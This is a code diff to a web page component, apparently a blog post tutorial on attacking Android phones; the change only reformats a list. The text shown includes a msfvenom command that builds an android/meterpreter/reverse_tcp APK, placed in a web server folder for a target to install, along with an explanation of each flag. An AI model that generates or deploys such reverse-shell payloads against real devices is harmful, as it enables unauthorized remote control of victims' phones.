@@ -34,14 +34,14 @@ function blog1() {
             <p>ip address is showing in red outline box. After getting your Local host IP use msfvenom tool that will generate a payload to penetrate the Android device. Type command:</p>
             <p class='command'>msfvenom –p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4444 R /var/www/html/ehacking.apk</p>
             <p>Where:</p>
-            <ul>
-                <li>-p indicates a payload type</li>
-                <li>android/metepreter/reverse_tcp specifies a reverse meterpreter shell would come in from a target Android device</li>
-                <li>LHOST is your local IP</li>
-                <li>LPORT is set to be as a listening port</li>
-                <li>R /var/www/html would give the output directly on apache server</li>
-                <li>apk is the name of output payload</li>
-            </ul>
+            <p>
+                -p indicates a payload type
+                android/metepreter/reverse_tcp specifies a reverse meterpreter shell would come in from a target Android device
+                LHOST is your local IP
+                LPORT is set to be as a listening port
+                R /var/www/html would give the output directly on apache server
+                apk is the name of output payload
+            </p>
             <h4>This would take some time to generate an apk file of almost ten thousand bytes.</h4>
             <img alt="" src={Payload} class="blog-page-cover"/>
             <h3>Launching an Attack</h3>
